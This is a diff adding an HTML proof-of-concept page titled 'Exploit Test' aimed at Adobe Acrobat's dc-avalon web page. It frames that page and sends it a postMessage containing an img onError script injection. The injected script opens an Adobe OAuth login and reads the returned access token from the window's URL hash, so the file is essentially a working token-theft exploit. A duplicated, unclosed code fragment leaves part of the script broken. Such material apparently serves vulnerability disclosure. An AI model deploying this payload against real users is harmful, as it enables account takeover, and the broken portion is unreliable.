@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit Test</title>
+    <script>
+        const iframe_payload = `window.exploit=function(){
+            e=window.open(\`https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2Fdc-prod-virgoweb%2FAdobeID%2Ftoken%3Fredirect_uri%3D${encodeURIComponent('https://acrobat.adobe.com/dc-avalon/1.13.0/index.html')}%26state%3D%257B%2522ac%2522%253A%2522adobe.com_acrobatweb_login%2522%252C%2522jslibver%2522%253A%2522v2-v0.55.0-1-g6de2b7c%2522%252C%2522nonce%2522%253A%25222900076524188648%2522%257D%26code_challenge_method%3Dplain%26use_ms_for_expiry%3Dtrue%26pba_policy%3DMedSecNoEV&client_id=dc-prod-virgoweb&scope=AdobeID%2Copenid%2CDCAPI%2Cadditional_info.account_type%2Cadditional_info.optionalAgreements%2Cagreement_sign%2Cagreement_send%2Csign_library_write%2Csign_user_read%2Csign_user_write%2Cagreement_read%2Cagreement_write%2Cwidget_read%2Cwidget_write%2Cworkflow_read%2Cworkflow_write%2Csign_library_read%2Csign_user_login%2Csao.ACOM_ESIGN_TRIAL%2Cee.dcweb%2Ctk_platform%2Ctk_platform_sync%2Cab.manage%2Cadditional_info.incomplete%2Cadditional_info.creation_source%2Cadditional_info.roles%2Cpps.read%2Cread_organizations%2Caccount_cluster.read%2Cupdate_profile.first_name%2Cupdate_profile.last_name&state=%7B%22ac%22%3A%22adobe.com_acrobatweb_login%22%2C%22jslibver%22%3A%22v2-v0.55.0-1-g6de2b7c%22%2C%22nonce%22%3A%222900076524188648%22%7D&relay=6419eb93-1dc6-43da-a35c-c4483132d3ef&locale=en_US&flow_type=token&dctx_id=v%3A2%2Cs%2C1b55f9a0-6796-11f0-bae3-c13d0bca4b82&idp_flow_type=login&s_p=google%2Cfacebook%2Capple%2Cline&response_type=token&pba_policy=MedSecNoEV&code_challenge_method=plain&redirect_uri=https%3A%2F%2Facrobat.adobe.com%2Flink%2Fhome%2F%3Fx_api_client_id%3Dloggedout_home%26x_api_client_location%3Dadobe%23old_hash%3D%26from_ims%3Dtrue%26client_id%3Ddc-prod-virgoweb%26api%3Dauthorize%26scope%3DAdobeID%2Copenid%2CDCAPI%2Cadditional_info.account_type%2Cadditional_info.optionalAgreements%2Cagreement_sign%2Cagreement_send%2Csign_library_write%2Csign_user_read%2Csign_user_write%2Cagreement_read%2Cagreement_write%2Cwidget_read%2Cwidget_write%2Cworkflow_read%2Cworkflow_write%2Csign_library_read%2Csign_user_login%2Csao.ACOM_ESIGN_TRIAL%2Cee.dcweb%2Ctk_platform%2Ctk_platform_sync%2Cab.manage%2Cadditional_info.incomplete%2Cadditional_info.creation_source%2Cadditional_info.roles%2Cpps.read%2Cread_organizations%2Caccount_cluster.read%2Cupdate_profile.first_name%2Cupdate_profile.last_name&use_ms_for_expiry=true#/\`);setInterval(function(){o=new URLSearchParams(e.location.hash.slice(1));o.has('access_token')&&(alert(o.get('access_token')),e.close())},1e3)},document.body.innerHTML=\`<a href='javascript:window.exploit()'>Click Here!!</a>\`;`;
+            
+            setInterval(function(){
+                o=new URLSearchParams(e.location.hash.slice(1));
+                if(o.has('access_token')){
+                    alert(o.get('access_token'));
+                    e.close();
+                }
+            },1000);
+        },
+        document.body.innerHTML=\`<a href='javascript:window.exploit()'>Click Here!!</a>\`;`;
+
+        function exploit() {
+            window.frames[0].postMessage({
+                "type":"AVALON_RENDER_CONTENT",
+                "html":"<img src=1 onError=\\"" + iframe_payload + "\\">"
+            }, '*');
+        }
+    </script>
+</head>
+
+<body>
+    <iframe 
+        src="https://acrobat.adobe.com/dc-avalon/1.13.0/index.html"
+        onload="exploit()"
+        width="100%"
+        height="100%"
+        style="border:none">
+    </iframe>
+</body>
+</html>
